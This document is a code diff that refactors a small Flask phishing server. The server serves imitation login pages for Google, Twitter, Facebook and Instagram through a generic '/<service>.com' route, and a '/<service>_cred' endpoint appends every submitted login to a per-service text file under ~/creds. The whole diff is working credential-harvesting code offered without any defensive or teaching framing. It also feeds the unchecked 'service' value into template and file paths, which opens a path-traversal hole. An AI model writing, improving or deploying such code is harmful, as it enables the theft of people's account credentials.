@@ -5,10 +5,17 @@ import errno
 
 app = Flask(__name__)
 
-CREDS_DIR = expanduser('~') + '/creds/'
+CREDS_DIR = expanduser('~') + '/creds'
 
 
-def mkdir_p():
+@app.route('/<service>.com')
+def login_page(service):
+    return render_template('%s.com.html' % service)
+
+
+@app.route('/<service>_cred', methods=['POST'])
+def store_cred(service):
+    # Create directory if it doesn't already exist
     try:
         os.makedirs(CREDS_DIR)
     except OSError as exc:
@@ -16,59 +23,7 @@ def mkdir_p():
             pass
         else:
             raise
-
-
-@app.route('/google.com')
-def google_page():
-    return render_template('google.com.html')
-
-
-@app.route('/twitter.com')
-def twitter_page():
-    return render_template('twitter.com.html')
-
-
-@app.route('/facebook.com')
-def facebook_page():
-    return render_template('facebook.com.html')
-
-
-@app.route('/instagram.com')
-def instagram_page():
-    return render_template('instagram.com.html')
-
-
-@app.route('/google_cred', methods=['POST'])
-def google_store_cred():
-    mkdir_p()
-    with open(CREDS_DIR + 'google.txt', 'a') as f:
-        f.write(request.data.decode() + '\n')
-
-    return ''
-
-
-@app.route('/twitter_cred', methods=['POST'])
-def twitter_store_cred():
-    mkdir_p()
-    with open(CREDS_DIR + 'twitter.txt', 'a') as f:
-        f.write(request.data.decode() + '\n')
-
-    return ''
-
-
-@app.route('/facebook_cred', methods=['POST'])
-def facebook_store_cred():
-    mkdir_p()
-    with open(CREDS_DIR + 'facebook.txt', 'a') as f:
-        f.write(request.data.decode() + '\n')
-
-    return ''
-
-
-@app.route('/instagram_cred', methods=['POST'])
-def instagram_store_cred():
-    mkdir_p()
-    with open(CREDS_DIR + 'instagram.txt', 'a') as f:
+    with open('%s/%s.txt' % (CREDS_DIR, service), 'a') as f:
         f.write(request.data.decode() + '\n')
 
     return ''
